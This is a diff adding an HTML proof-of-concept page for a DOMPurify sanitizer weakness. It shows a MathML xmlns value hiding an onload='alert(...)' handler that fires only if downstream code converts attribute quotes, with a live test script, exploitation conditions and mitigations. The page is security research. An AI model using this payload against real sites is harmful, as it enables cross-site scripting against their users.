@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC: DOMPurify xmlns Attribute Value Injection (mXSS Adjacent)</title>
+<style>
+body { font-family: monospace; margin: 2em; background: #111; color: #ddd; }
+h1 { color: #f44; }
+h2 { color: #ff0; }
+pre { background: #1a1a2e; padding: 1em; border-radius: 4px; overflow-x: auto; }
+.danger { color: #f44; }
+.safe { color: #4f4; }
+.warn { color: #ff0; }
+.box { border: 1px solid #333; padding: 1em; margin: 1em 0; border-radius: 4px; }
+code { background: #222; padding: 0.2em 0.4em; border-radius: 2px; }
+</style>
+</head>
+<body>
+
+<h1>PoC: DOMPurify xmlns Attribute Value Injection</h1>
+<p><strong>Finding:</strong> mxss_taxonomy_v2 / 0001_critical_xss</p>
+<p><strong>Affected:</strong> DOMPurify (tested via JSDOM)</p>
+<p><strong>Category:</strong> Sanitizer Weakness / mXSS Adjacent Pattern</p>
+
+<h2>1. Vulnerability Description</h2>
+<div class="box">
+<p>DOMPurify allows a <code>&lt;math&gt;</code> element with a crafted <code>xmlns</code> attribute
+that embeds an event handler pattern within the attribute value using mixed quote styles:</p>
+<pre>&lt;math xmlns="http://www.w3.org/1998/Mat<span class="danger">' onload='</span>h/MathML"&gt;</pre>
+<p>The attribute value contains single-quoted segments that, if the outer quoting is ever changed
+from double to single quotes by any downstream processing, would cause the browser to parse
+<code>onload</code> as a separate attribute:</p>
+<pre>&lt;math xmlns=<span class="danger">'</span>http://www.w3.org/1998/Mat<span class="danger">'</span> <span class="danger">onload='h/MathML'</span>&gt;</pre>
+</div>
+
+<h2>2. Attack Vector</h2>
+<div class="box">
+<pre>
+Attacker Input:
+  &lt;math xmlns="http://www.w3.org/1998/Mat' onload='alert(1)//"&gt;...&lt;/math&gt;
+
+DOMPurify Output (double-quoted = safe):
+  &lt;math xmlns="http://www.w3.org/1998/Mat' onload='alert(1)//"&gt;
+
+If downstream converts to single quotes (EXPLOITABLE):
+  &lt;math xmlns='http://www.w3.org/1998/Mat' onload='alert(1)//'&gt;
+</pre>
+</div>
+
+<h2>3. Live Test</h2>
+<div class="box">
+<p>Testing DOMPurify sanitization and innerHTML round-trip in this browser:</p>
+<div id="test-result"></div>
+</div>
+
+<h2>4. Conditions for Exploitation</h2>
+<div class="box">
+<ul>
+<li>Server-side template engine that re-serializes attributes with single quotes</li>
+<li>Custom HTML serializer/pretty-printer that normalizes quote style</li>
+<li>Proxy or WAF that modifies attribute quoting</li>
+<li>SSR framework that re-renders sanitized HTML with different quoting conventions</li>
+</ul>
+</div>
+
+<h2>5. Mitigation</h2>
+<div class="box">
+<ul>
+<li>DOMPurify should reject or sanitize xmlns values containing embedded quotes + event handler patterns</li>
+<li>Never change attribute quoting style of sanitized HTML output</li>
+<li>Use CSP headers as defense-in-depth</li>
+</ul>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.4/purify.min.js"></script>
+<script>
+const input = `<math xmlns="http://www.w3.org/1998/Mat' onload='alert(document.domain)//h/MathML">
+<mi>test</mi>
+</math>`;
+
+const result = document.getElementById("test-result");
+let html = "";
+
+// Test 1: DOMPurify sanitization
+const sanitized = DOMPurify.sanitize(input);
+html += `<p><strong>Input:</strong></p><pre>${input.replace(/</g,"&lt;")}</pre>`;
+html += `<p><strong>DOMPurify Output:</strong></p><pre>${sanitized.replace(/</g,"&lt;")}</pre>`;
+
+// Test 2: innerHTML round-trip
+const div = document.createElement("div");
+div.innerHTML = sanitized;
+const reparsed = div.innerHTML;
+html += `<p><strong>Browser Re-parsed:</strong></p><pre>${reparsed.replace(/</g,"&lt;")}</pre>`;
+
+// Test 3: Check if onload is a real attribute
+const mathEl = div.querySelector("math");
+const hasOnload = mathEl && mathEl.hasAttribute("onload");
+html += `<p><strong>onload attribute in DOM:</strong> ${hasOnload
+  ? '<span class="danger">YES - EXPLOITABLE</span>'
+  : '<span class="safe">NO - Safe in current context</span>'}</p>`;
+
+// Test 4: Simulate single-quote re-serialization
+const singleQuoted = sanitized.replace(/(\w+)="([^"]*)"/g, "$1='$2'");
+html += `<p><strong>Single-quote re-serialized:</strong></p><pre>${singleQuoted.replace(/</g,"&lt;")}</pre>`;
+
+const div2 = document.createElement("div");
+div2.innerHTML = singleQuoted;
+const mathEl2 = div2.querySelector("math");
+const hasOnload2 = mathEl2 && mathEl2.hasAttribute("onload");
+html += `<p><strong>onload after single-quote conversion:</strong> ${hasOnload2
+  ? '<span class="danger">YES - EXPLOITABLE via quote conversion!</span>'
+  : '<span class="safe">NO</span>'}</p>`;
+
+result.innerHTML = html;
+</script>
+
+</body>
+</html>
